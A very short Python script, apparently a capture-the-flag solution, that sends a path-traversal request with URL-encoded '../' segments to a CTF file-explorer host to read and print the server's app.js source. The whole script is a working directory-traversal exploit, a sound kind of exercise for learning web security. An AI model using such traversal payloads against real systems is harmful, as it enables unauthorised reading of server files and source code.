# Do snyk-linux test & attack vuln

import requests

resp = requests.get('http://file-explorer.c.ctf-snyk.io/public/%2e%2e/%2e%2e/app.js')

print(resp.text)